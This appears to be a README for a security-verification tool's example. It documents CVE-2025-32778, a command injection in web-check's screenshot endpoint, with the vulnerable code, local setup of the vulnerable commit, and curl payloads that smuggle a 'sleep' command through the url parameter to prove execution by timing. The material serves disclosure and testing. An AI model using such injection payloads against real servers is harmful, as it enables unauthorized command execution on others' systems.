# GHSA-5qg5-g7c2-pfx8

Unauthenticated OS command injection in [web-check](https://github.com/Lissy93/web-check)
(`CVE-2025-32778`). The `/api/screenshot` endpoint interpolates the user-controlled
`url` query parameter straight into a shell string passed to Node's
`child_process.exec`:

```js
// api/screenshot.js (vulnerable ref)
const command = `${chromePath} --headless --disable-gpu --no-sandbox --screenshot=${path} "${url}"`;
exec(command, ...);
```

Because `exec` spawns `/bin/sh`, an attacker breaks out of the double-quoted `url`
argument and runs arbitrary commands. A `new URL()` check runs first, so the payload
keeps a valid URL prefix and appends the injection in the query string. This example
proves it **time-based**: an injected `sleep 5` holds the response ~5 s longer than
`sleep 0`, while status and body stay identical (the output is never reflected).

Sources:

- https://github.com/Lissy93/web-check/security/advisories/GHSA-5qg5-g7c2-pfx8
- https://osv.dev/vulnerability/CVE-2025-32778
- Fix commit (`exec` → `execFile`): https://github.com/Lissy93/web-check/commit/0e4958a

## Reproduce

Clone the repo at the vulnerable commit (the direct parent of the `exec`→`execFile` fix):

```bash
git clone https://github.com/Lissy93/web-check.git
cd web-check
git checkout 99653868c7fa91eaca9684a69ecd86c3375b237e
npm install --omit=dev --legacy-peer-deps   # --legacy-peer-deps: chrome-aws-lambda peer conflict

# CHROME_PATH=/bin/true makes the screenshot exec a fast no-op; the injected
# shell command still runs synchronously before the exec callback, so the
# timing signal is clean and the body is constant across requests.
PORT=3009 DISABLE_GUI=true API_CORS_ORIGIN='*' CHROME_PATH=/bin/true node server
```

The server listens on `http://127.0.0.1:3009`. Quick manual check:

```bash
curl -s -G http://127.0.0.1:3009/api/screenshot --data-urlencode 'url=http://127.0.0.1/?x=";sleep 5;"' -o /dev/null -w '%{time_total}\n'   # ~5.0s
curl -s -G http://127.0.0.1:3009/api/screenshot --data-urlencode 'url=http://127.0.0.1/?x=";sleep 0;"' -o /dev/null -w '%{time_total}\n'   # ~0.0s
```

In another terminal from the `nocapsec` repo:

```bash
nocapsec verify -internal examples/command-injection-time-based-web-check/evidence.json
```

The evidence is one `base_request` plus an `injection` slot (`query` param `url`)
and three payload values (control / `sleep 0` / `sleep 5`). The engine builds the
three arms by planting each value into that one slot, replays them in randomized,
repeated order, and measures the median latency delta. A verified report
(`delta_ms` ≈ 5000 over a 3500 ms threshold, identical status/body) proves the
injected command executed server-side.
